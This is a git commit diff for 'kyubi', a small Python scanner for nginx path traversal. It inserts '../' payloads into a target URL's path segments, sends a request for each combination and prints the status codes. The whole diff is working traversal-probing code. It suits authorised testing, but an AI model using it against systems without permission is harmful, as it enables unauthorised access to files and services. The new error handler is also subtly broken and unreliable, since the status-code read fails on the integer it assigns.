c6b699b29408c622853c8f588598dbc59d1f3413
Mohd Shibli Qureshi <mohdshibli27@gmail.com>
2019-10-05 10:07:18 +0530

    more combinations added

--- kyubi/core.py
+++ kyubi/core.py
@@ -6,36 +6,44 @@ import requests as rq
 argparser = ag.ArgumentParser(description="This is a nginx traversal tool")
 argparser.add_argument("url", type=str, help="URL of the target")
 argparser.add_argument("-v", help="increase verbosity", action="store_true", dest="verbose")
-argparser.add_argument("-d", help="wordlist path", type=str,  dest="wlist")
 argparser.add_argument("-a", help="append segment in the end", action="store_true")
 
 args = argparser.parse_args()
 
+payloads = ["../", "../../", "../../../../../../../../../../../"]
+
 def make_a_request (url):
-    resp = rq.get(url, verify=True)
+    try:
+        resp = rq.get(url, verify=True)
+    except Exception as e:
+        resp = 500
     return str(resp.status_code)
 
 def main():
-    payloads = ["../", "../../", "../../../../../../../../../../../"]
-
     parser = urlparse(args.url)
     path = parser.path
 
     segments = path.split("/")
-    segments = segments[1: len(segments)-1]
+    segments = segments[1: len(segments)]
 
     _str = ""
     _marks = ('-'*80)
     sys.stdout.write("\n{0:50}\t{1}\n{2}\n".format("URL", "Status",_marks))
     for segment in segments:
         _str += "/"+segment
-        if(args.a):
-            _x = segment
+        if(args.a): _x = segment
         else:
             _x = ""
         for payload in payloads:
             _url = "{}://{}{}{}{}".format(parser.scheme, parser.netloc, _str, payload, _x)
             sys.stdout.write("{0} \033[92m[{1}]\033[00m\n".format(_url, make_a_request(_url)))
+
+    for i in range(0, len(segments)-1):
+        for payload in payloads:
+            _url = parser.scheme+"://"+parser.netloc+"/" + '/'.join(segments[0:i+1]) + payload + '/'.join(segments[i+1:len(segments)])
+            sys.stdout.write("{} \033[92m[{}]\033[00m\n".format(_url, make_a_request(_url)))
+
+
 
 
 if __name__ == '__main__':
